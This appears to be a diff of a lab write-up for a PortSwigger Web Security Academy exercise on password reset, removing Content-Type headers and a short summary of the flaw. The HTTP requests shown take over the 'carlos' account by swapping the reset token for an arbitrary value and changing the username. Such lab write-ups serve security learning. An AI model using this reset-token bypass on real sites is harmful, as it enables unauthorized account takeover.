@@ -59,7 +59,6 @@ Submitting my username generated the following request:
 POST /forgot-password HTTP/2
 Host: 0a88004004da336a82187e610037003a.web-security-academy.net
 Cookie: session=isUNkJ3Sqzkpr5NJTGEiiDq2S6NXs9dA
-Content-Type: application/x-www-form-urlencoded
 
 username=wiener
 ```
@@ -82,7 +81,6 @@ When I submitted a new password (I reused `peter`), Burp showed this request:
 ```http
 POST /forgot-password?temp-forgot-password-token=m8g5rhxn13s95anx23dpf9838h8ci02f HTTP/2
 Host: 0a88004004da336a82187e610037003a.web-security-academy.net
-Content-Type: application/x-www-form-urlencoded
 
 temp-forgot-password-token=m8g5rhxn13s95anx23dpf9838h8ci02f&username=wiener&new-password-1=peter&new-password-2=peter
 ```
@@ -94,7 +92,6 @@ I took the same request and modified it:
 ```http
 POST /forgot-password?temp-forgot-password-token=meow HTTP/2
 Host: 0a88004004da336a82187e610037003a.web-security-academy.net
-Content-Type: application/x-www-form-urlencoded
 
 temp-forgot-password-token=meow&username=carlos&new-password-1=peter&new-password-2=peter
 ```
@@ -103,10 +100,6 @@ Changes made:
 
 - Replaced the token with a random value (meow) 😺
 - Changed the username from `wiener` to `carlos`
-
-No validation.
-No ownership check.
-No token-to-user binding.
 
 After sending the request, I went back to the login page, logged in as `carlos:peter`, and landed straight on the account page.
 
